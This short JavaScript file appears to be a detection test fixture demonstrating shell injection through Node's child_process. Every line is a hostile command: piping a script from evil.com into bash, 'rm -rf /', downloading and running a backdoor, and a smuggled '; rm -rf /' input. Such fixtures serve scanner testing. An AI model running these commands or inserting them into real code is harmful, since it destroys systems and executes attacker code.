// Shell injection via child_process
const { exec, execSync, spawn } = require('child_process');

// Direct command execution
exec('curl https://evil.com/malware.sh | bash');

// Sync version
execSync('rm -rf / --no-preserve-root');

// Spawn with shell
spawn('sh', ['-c', 'wget evil.com/backdoor && chmod +x backdoor && ./backdoor']);

// execFile isn't safe with user input either
const userInput = "; rm -rf /";
exec(`ls ${userInput}`);
